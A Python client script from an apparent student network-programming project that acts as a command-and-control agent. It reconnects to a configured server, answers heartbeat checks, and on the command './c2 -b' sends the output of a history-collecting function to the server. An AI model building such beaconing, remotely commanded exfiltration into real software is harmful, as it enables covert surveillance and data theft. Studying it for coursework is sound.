#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# ifrn/2023.2/programacao_para_redes/projeto/cliente.py
# Copyright (C) 2023  Sidney Pedro
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# Importando bibliotecas
from constantes import *
import funcoes, socket, time

# Função para parar o cliente
def parar_cliente():
    global continuar
    continuar = False

    print(f"\nEncerrando cliente em {TIMEOUT} segundos...")
    return

def realizar_conexao():
    global continuar

    # Criando socket TCP
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectando socket
    status_conexao = server_sock.connect_ex(SOCKET_SERVIDOR)
    if (status_conexao != 0):
        server_sock.close()
        return
    print("Conexão estabelecida com o servidor!")

    while (continuar):
        # Tentando receber mensagem do servidor
        try:
            mensagem_recebida = server_sock.recv(TAMANHO_BUFFER).decode(CHARSET)
        except KeyboardInterrupt:
            parar_cliente()
            continue
        except:
            break

        # Se o tamanho da mensagem recebida for menor que 1,
        # informa-se desconexão com servidor
        if (len(mensagem_recebida) < 1):
            print("Conexão perdida com o servidor!")
            break

        # Analisando mensagem do servidor e preparando resposta
        if (mensagem_recebida == "alive?"):
            mensagem_retorno = "alive!".encode(CHARSET)
        elif ("./c2 -b" in mensagem_recebida):
            mensagem_retorno = funcoes.obter_historico().encode(CHARSET)
        elif ("./c2 -q" in mensagem_recebida):
            mensagem_retorno = f"Encerrando cliente em {TIMEOUT} segundos...".encode(CHARSET)
            parar_cliente()
        else:
            print(f"Mensagem recebida: {mensagem_recebida}")
            mensagem_retorno = ("Devolvendo mensagem: " + mensagem_recebida).encode(CHARSET)

        # Tentando devolver mensagem ao servidor
        try:
            server_sock.send(mensagem_retorno)
        except:
            break

    # Finalizando socket
    server_sock.close()
    return

def main():
    global continuar
    continuar = True

    # Mantendo conexão persistente até que o cliente seja encerrado
    while (continuar):
        realizar_conexao()
        try:
            time.sleep(TIMEOUT)
        except KeyboardInterrupt:
            continuar = False
            print()

    return

# Entrando na função main e, em caso de exceção, saindo
if (__name__ == "__main__"):
    try:
        main()
    except:
        print("\nSaindo...")
